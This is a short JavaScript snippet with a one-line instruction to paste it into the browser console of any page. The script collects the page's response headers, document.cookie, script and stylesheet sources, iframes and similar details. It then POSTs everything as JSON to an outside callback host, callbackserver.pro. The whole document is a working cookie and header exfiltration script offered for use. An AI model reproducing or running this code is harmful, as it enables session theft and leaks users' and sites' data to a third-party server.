
Paste into console, on any populated page and it *should* POST the header data to the callbackserver.pro target
  

(function autoCollectAndPostData() {
  // Function to fetch headers
  function getHeaders() {
    return fetch(window.location.href).then(response => {
      const headers = {};
      response.headers.forEach((value, name) => headers[name] = value);
      return headers;
    });
  }

  // Function to get cookies
  function getCookies() {
    return document.cookie;
  }

  // Function to detect CORS policy
  function checkCORS() {
    return fetch(window.location.href, { mode: 'no-cors' })
      .then(response => response.type)
      .catch(error => 'CORS Policy Blocked');
  }

  // Function to get DNS prefetch settings
  function getDNSPrefetch() {
    return [...document.querySelectorAll('link[rel=dns-prefetch]')].map(link => link.href);
  }

  // Function to get loaded JavaScript files
  function getJavaScriptFiles() {
    return [...document.querySelectorAll('script')].map(script => script.src);
  }

  // Function to enumerate external stylesheets
  function getStylesheets() {
    return [...document.styleSheets].map(sheet => sheet.href);
  }

  // Function to check protocol (HTTP/1.1, HTTP/2, or HTTP/3)
  function checkProtocol() {
    return fetch(window.location.href).then(response => response.url.startsWith('https') ? 'HTTP/2 or HTTP/3' : 'HTTP/1.1');
  }

  // Function to list all iframes on the page
  function listIframes() {
    return [...document.querySelectorAll('iframe')].map(iframe => iframe.src);
  }

  // Combine all the data into one object and send it via POST
  Promise.all([
    getHeaders(),
    checkCORS(),
    getDNSPrefetch(),
    getJavaScriptFiles(),
    getStylesheets(),
    checkProtocol(),
    listIframes()
  ]).then(values => {
    const [headers, cors, dnsPrefetch, jsFiles, stylesheets, protocol, iframes] = values;

    const data = {
      headers: headers,
      cookies: getCookies(),
      cors: cors,
      dnsPrefetch: dnsPrefetch,
      jsFiles: jsFiles,
      stylesheets: stylesheets,
      protocol: protocol,
      iframes: iframes
    };

    // POST the collected data
    fetch('https://callbackserver.pro', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json())
      .then(data => console.log('Data successfully posted:', data))
      .catch(error => console.error('Error posting data:', error));
  });
})();

